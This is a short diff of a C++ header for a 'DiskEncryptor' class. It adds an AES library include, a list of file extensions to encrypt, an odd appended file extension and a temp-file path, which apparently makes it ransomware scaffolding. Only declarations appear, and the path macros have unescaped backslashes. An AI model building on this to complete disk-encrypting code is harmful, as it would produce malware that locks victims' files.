@@ -1,9 +1,11 @@
 #include <string>
 
+#include <cryptopp/aes.h>
+
 
 #include "headers.h"
 
-#define TABLE_TEMP_FILE(username) "C:\Users\." username "\AppData\Local\Temp"
+#define TABLE_TEMP_FILE(username, disk) "C:\Users\." username "\AppData\Local\Temp\." disk ".tmp"
 #define FILE_EXTENSION ".4N&xcM"
 
 const std::string ext2Ecrypt[] = {
@@ -20,21 +22,18 @@ class DiskEncryptor
 
 private:
 
-	std::string disks;
-	long long freespace;
-	int numberOfFiles;
+	std::string _disk;
+	unsigned long _freespace;
+	unsigned _numberOfFiles;
 
 
 public:
 
-	DiskEncryptor(std::string disks);
+	DiskEncryptor(std::string disk);
 	~DiskEncryptor();
 
-	bool setFileExtension();
+	bool setDisk(std::string disk);
+	bool setFreeSpace();
 
-
-
-	
-	
 
 };
